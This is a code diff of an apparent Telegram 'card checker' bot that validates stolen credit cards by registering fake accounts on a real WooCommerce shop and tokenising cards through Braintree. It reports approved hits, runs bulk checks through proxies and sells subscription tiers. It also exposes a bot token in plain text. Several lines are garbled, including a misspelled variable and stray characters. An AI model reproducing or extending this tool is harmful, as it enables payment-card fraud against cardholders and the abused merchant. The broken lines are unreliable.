@@ -30,7 +30,7 @@ TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8009942983:AAFmR3uuFuCw8_mY5ucOgVA-MQGN
 OWNER_ID = 7593550190  # Replace with your Telegram ID
 
 # Proxy settings
-PROXY = True
+PROXY = False
 try:
     with open('proxies.txt', 'r') as f:
         PROXY_LIST = [line.strip() for line in f.readlines() if line.strip()]
@@ -53,7 +53,7 @@ bulk_progress = {}  # Track bulk check progress
 stop_checking = {}  # Track stop requests per user
 COOLDOWN_SECONDS = 70
 MAX_CONCURRENT_PER_USER = 3
-MAX_CONCURRENT_SINGLE = 20
+MAX_CONCURRENT_SINGLE = 3
 
 async def get_user(user_id):
     user = await users_collection.find_one({'user_id': user_id})
@@ -117,8 +117,8 @@ async def get_bin_details(bin_number):
                     bank = data.get('bank', 'Unknown')
                     card_type = data.get('brand', 'Unknown').capitalize()
                     card_level = data.get('level', 'Unknown')
-                    card_type_category = data.get('戦隊', 'Unknown')
-                    country_name = data.get('country_name', 'Unknown')
+                    card_type_category = data.get('type', 'Unknown')
+                    country_name = data.get('country_name', '')
                     country_flag = data.get('country_flag', '')
                     return bank, card_type, card_level, card_type_category, country_name, country_flag
                 else:
@@ -135,7 +135,6 @@ async def test_proxy(proxy_url):
                 proxy=proxy_url,
                 timeout=5,
                 headers={'user-agent': user},
-                ssl=False
             ) as response:
                 return response.status == 200
     except (aiohttp.ClientError, asyncio.TimeoutError):
@@ -173,27 +172,27 @@ async def check_cc(cc_details):
                 reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', text).group(1)
 
             data = {
-                'username': username, 'email': acc, 'password': 'SandeshThePapa@',
+                'username': username, 'email': acc, 'password': 'SandeshData@123',
                 'woocommerce-register-nonce': reg, '_wp_http_referer': '/my-account/', 'register': 'Register'
             }
-            async with session.post('https://www.bebebrands.com/my-account/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
+            async with session.post('https://www.bebebrands.com/my-account/', headers=headers, data=data, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                 pass
 
-            async with session.get('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, proxy=proxies['http'] if proxies else None) as r:
+            async with session.get('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                 text = await r.text()
                 address_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', text).group(1)
 
             data = {
                 'billing_first_name': first_name, 'billing_last_name': last_name, 'billing_country': 'GB',
                 'billing_address_1': street_address, 'billing_city': city, 'billing_postcode': zip_code,
-                'billing_phone': num, 'billing_email': acc, 'save_address': 'Save address',
+                'billing_phone': num, 'email': acc, 'save_address': 'Save address',
                 'woocommerce-edit-address-nonce': address_nonce,
                 '_wp_http_referer': '/my-account/edit-address/billing/', 'action': 'edit_address'
             }
-            async with session.post('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
+            async with session.post('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, data=data, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                 pass
 
-            async with session.get('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, proxy=proxies['http'] if proxies else None) as r:
+            async with session.get('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, proxy=proxiesliks['http'] if proxies else None, ssl=False) as r:
                 text = await r.text()
                 add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', text).group(1)
                 client_nonce = re.search(r'client_token_nonce":"([^"]+)"', text).group(1)
@@ -201,7 +200,7 @@ async def check_cc(cc_details):
             data = {
                 'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce
             }
-            async with session.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
+            async with session.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', headers=headers, data=data, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                 token_resp = await r.json()
                 enc = token_resp['data']
                 dec = base64.b64decode(enc).decode('utf-8')
@@ -217,7 +216,7 @@ async def check_cc(cc_details):
                 'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mes, 'expirationYear': ano, 'cvv': cvv}, 'options': {'validate': False}}},
                 'operationName': 'TokenizeCreditCard'
             }
-            async with session.post('https://payments.braintree-api.com/graphql', headers=tokenize_headers, json=json_data, proxy=proxies['http'] if proxies else None) as r:
+            async with session.post('https://payments.braintree-api.com/graphql', headers=tokenize_headers, json=json_data, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                 tok = (await r.json())['data']['tokenizeCreditCard']['token']
 
             headers.update({
@@ -231,7 +230,7 @@ async def check_cc(cc_details):
                 ('wc-braintree-credit-card-tokenize-payment-method', 'true'), ('woocommerce-add-payment-method-nonce', add_nonce),
                 ('_wp_http_referer', '/my-account/add-payment-method/'), ('woocommerce_add_payment_method', '1')
             ]
-            async with session.post('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as response:
+            async with session.post('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, data=data, proxy=proxies['http'] if proxies else None, ssl=False) as response:
                 text = await response.text()
                 soup = BeautifulSoup(text, 'html.parser')
                 error_message = soup.select_one('.woocommerce-error .message-container')
@@ -259,6 +258,20 @@ async def check_cc(cc_details):
             result['status'] = 'declined'
 
         return result
+    except aiohttp.ClientSSLError as ssl_err:
+        return {
+            'card': full,
+            'status': 'error',
+            'message': f"SSL Error: {str(ssl_err)}",
+            'time_taken': time.time() - start_time,
+            'proxy_status': proxy_status,
+            'issuer': issuer,
+            'card_type': card_type,
+            'card_level': card_level,
+            'card_type_category': card_type_category,
+            'country_name': 'Unknown',
+            'country_flag': ''
+        }
     except aiohttp.ClientError as e:
         return {
             'card': full,
@@ -339,7 +352,7 @@ async def single_check(user_id, cc_details, update, context, is_bulk, bulk_id):
     if checking_msg:
         await checking_msg.delete()
 
-    card_info = f"{result['card_type']} - {result['card_level']} - {result['card_type_category']}"
+    card_info = f"{result['card_type']} {{ {result['card_level']} }} {{ {result['card_type_category']} }}"
     issuer = result['issuer']
     country_display = f"{result['country_name']} {result['country_flag']}" if result['country_flag'] else result['country_name']
     checked_by = f"<a href='tg://user?id={user_id}'>{user_id}</a>"
@@ -349,7 +362,7 @@ async def single_check(user_id, cc_details, update, context, is_bulk, bulk_id):
         msg = (f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n\n"
                f"[ϟ]𝗖𝗮𝗿𝗱 -» <code>{result['card']}</code>\n"
                f"[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Braintree Auth\n"
-               f"[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» Approved ✅\n\n"
+               f"[ϟ]�_R𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» Approved ✅\n\n"
                f"[ϟ]𝗜𝗻𝗳𝗼 -» {card_info}\n"
                f"[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛\n"
                f"[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country_display}\n\n"
@@ -364,7 +377,7 @@ async def single_check(user_id, cc_details, update, context, is_bulk, bulk_id):
     elif result['status'] == 'declined' and not is_bulk:
         msg = (f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n\n"
                f"[ϟ]𝗖𝗮𝗿𝗱 -» <code>{result['card']}</code>\n"
-               f"[ϟ]G𝗮𝘁𝗲𝘄𝗮𝘆 -» Braintree Auth\n"
+               f"[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Braintree Auth\n"
                f"[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {result['message']}\n\n"
                f"[ϟ]𝗜𝗻𝗳𝗼 -» {card_info}\n"
                f"[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛\n"
@@ -373,16 +386,14 @@ async def single_check(user_id, cc_details, update, context, is_bulk, bulk_id):
                f"[⌬]𝗣𝗿𝗼𝘅𝘆 -» {result['proxy_status']}\n"
                f"[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» {checked_by} {tier}\n"
                f"[み]𝗕𝗼𝘁 -» <a href='tg://user?id=8009942983'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>")
-        if 'Status code cvv: Gateway Rejected: cvv' in result['message']:
+        if '2010: Card Issuer Declined CVV' in result['message']:
             msg = msg.replace("𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌", "𝐂𝐂𝐍 ✅")
         await update.message.reply_text(msg, parse_mode='HTML')
 
     if is_bulk and bulk_id in bulk_progress:
         progress = bulk_progress[bulk_id]
         async with progress['lock']:
-            # Set last_response unconditionally
-            last_response = result['message']
-
+            last_response = result['message']  # Always set last_response
             if result['status'] == 'approved':
                 progress['approved'] += 1
                 progress['hits'].append(result['card'])
@@ -455,10 +466,10 @@ async def send_final_message(user_id, bulk_id, context):
                 f"[✪] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝: {approved + declined}/{total}\n"
                 f"[✪] 𝐓𝐨𝐭𝐚𝐥: {total}\n"
                 f"[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration:.2f} seconds\n"
-                f"[✪walking] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {speed:.2f} cards/sec\n"
+                f"[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {speed:.2f} cards/sec\n"
                 f"[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: {success_rate:.1f}%\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"[み] 𝐃𝐞𝐯: <a href='tg://user?id=7593550190'>𓆰𝅃꯭᳚⚡!! ⏤‌𝐅ɴ x 𝐄ʟᴇᴄᴛʀᴀ𓆪𓆪⏤‌➤⃟🔥�ales</a>"
+                f"[み] 𝐃𝐞𝐯: <a href='tg://user?id=7593550190'>𓆰𝅃꯭᳚⚡!! ⏤‌𝐅ɴ x 𝐄ʟᴇᴄᴛʀᴀ𓆪𓆪⏤‌➤⃟🔥</a>"
             ),
             parse_mode='HTML',
             reply_markup=reply_markup
@@ -630,6 +641,11 @@ async def delkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = int(context.args[0])
     except (IndexError, ValueError):
         await update.message.reply_text("Usage: /delkey <user_id>\nExample: /delkey 123456789")
+        return
+
+    user = await get_user(user_id)
+    if not user or 'tier' not in user:
+        await update.message.reply_text(f"No active subscription found for user ID {user_id}.")
         return
 
     await delete_user_subscription(user_id)
